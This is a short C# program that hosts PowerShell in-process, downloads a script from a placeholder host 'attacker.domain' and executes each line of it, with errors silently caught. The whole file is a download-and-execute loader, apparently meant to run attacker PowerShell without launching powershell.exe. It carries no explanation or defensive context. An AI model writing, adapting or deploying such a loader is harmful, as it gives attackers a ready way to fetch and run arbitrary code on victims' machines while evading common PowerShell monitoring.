using System;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using PowerShell = System.Management.Automation.PowerShell;

namespace Powershell
{
	class Program
    {
        static void Main(string[] args)
        {
			PowerShell Ps_instance = PowerShell.Create();

			WebClient myWebClient = new WebClient();
			try {
				var script1 = myWebClient.DownloadString("http://attacker.domain/folder/script.txt");
				string[] array = script1.Split('\n');
				foreach (string value in array)
				{
					Ps_instance.AddScript(value);
				}
			} catch{
			}
			
			Ps_instance.AddCommand("out-string");
			Ps_instance.Invoke();

		}
    }
}
